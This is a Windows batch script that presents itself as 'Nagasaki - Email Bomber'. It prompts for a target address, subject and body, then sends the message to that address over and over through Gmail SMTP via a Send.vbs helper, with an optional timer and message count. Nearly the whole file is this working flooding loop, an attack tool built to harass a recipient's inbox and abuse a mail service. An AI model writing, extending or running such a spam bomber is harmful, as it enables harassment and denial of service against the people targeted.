@echo off
color f0
mode 81,30
title Nagasaki - Email Bomber
echo  ________   ________  ________  ________  ________  ________  ___  __    ___     
echo ^|^\   ___  ^\^|^\   __  ^\^|^\   ____^\^|^\   __  ^\^|^\   ____^\^|^\   __  ^\^|^\  ^\^|^\  ^\ ^|^\  ^\    
echo ^\ ^\  ^\^\ ^\  ^\ ^\  ^\^|^\  ^\ ^\  ^\___^|^\ ^\  ^\^|^\  ^\ ^\  ^\___^|^\ ^\  ^\^|^\  ^\ ^\  ^\^/  ^/^|^\ ^\  ^\   
echo  ^\ ^\  ^\^\ ^\  ^\ ^\   __  ^\ ^\  ^\  __^\ ^\   __  ^\ ^\_____  ^\ ^\   __  ^\ ^\   ___  ^\ ^\  ^\  
echo   ^\ ^\  ^\^\ ^\  ^\ ^\  ^\ ^\  ^\ ^\  ^\^|^\  ^\ ^\  ^\ ^\  ^\^|____^|^\  ^\ ^\  ^\ ^\  ^\ ^\  ^\^\ ^\  ^\ ^\  ^\ 
echo    ^\ ^\__^\^\ ^\__^\ ^\__^\ ^\__^\ ^\_______^\ ^\__^\ ^\__^\____^\_^\  ^\ ^\__^\ ^\__^\ ^\__^\^\ ^\__^\ ^\__^\
echo     ^\^|__^| ^\^|__^|^\^|__^|^\^|__^|^\^|_______^|^\^|__^|^\^|__^|^\_________^\^|__^|^\^|__^|^\^|__^| ^\^|__^|^\^|__^|
echo                                             ^\^|_________^|                         
echo Email Bomber, v1.0, By: 1114
echo.


::INTERNET
echo Checking intenet connection...
ping -n 1 google.com > nul
if %errorlevel% neq 1 goto skip0
echo (-) No intenet connection
echo.
pause
exit
:skip0
echo (+) Nagsaki is ready!
echo.

echo To:
set /p To=
echo Subject:
set /p Subj=
echo Body:
set /p Body=
set SMTP=smtp.gmail.com
set b=0

::BLACKLIST
if not exist BLACKLIST.dat goto skip
findstr /C:%To% BLACKLIST.dat
if errorlevel 1 goto skip
echo.
echo Permission denied
pause
exit
:skip

::TIMER
:tt
echo Set spam timer? [Y]es/[N]o
set /p timer=
if %timer%==n goto skip1
if %timer%==N goto skip1
if %timer%==y goto sub && echo Type time in seconds
if %timer%==Y goto sub && echo Type time in seconds
goto tt
:sub
set /p timer_time=
echo (+) Timer set!
type NUL> timer.bat
echo timeout ^/t %timer_time% ^/NOBREAK>> timer.bat
echo taskkill ^/fi "windowtitle eq Nagasaki - Email Bomber" ^/im cmd.exe>> timer.bat
echo del %%0 ^&^& exit>> timer.bat
start /MIN timer.bat
:skip1

::COUNT
:cc
echo Set mails count? [Y]es/[N]o
set /p userinput=
if %userinput%==n goto skip2
if %userinput%==N goto skip2
if %userinput%==y goto sub1 && echo Set mails count
if %userinput%==Y goto sub1 && echo Set mails count
goto cc
:sub1
set /p count=
echo (+) Mails count set!
:skip2

echo.
echo Log:
:a
::COUNT
if %userinput%==y goto count_check
if %userinput%==Y goto count_check
:skip3

Send.vbs YOUR_EMAIL@gmail.com %To% "%Subj%" "%Body%" %SMTP% YOUR_EMAIL@gmail.com YOUR_PASSWORD
if errorlevel 1 goto error
@set /a "b=%b%+1"
echo (+) %b%. Email sent %time%
goto a

:error
echo (-) An error occurred
pause
goto a

:end
echo Permission denied
pause
exit

:count_check
IF %b%==%count% exit
goto skip3
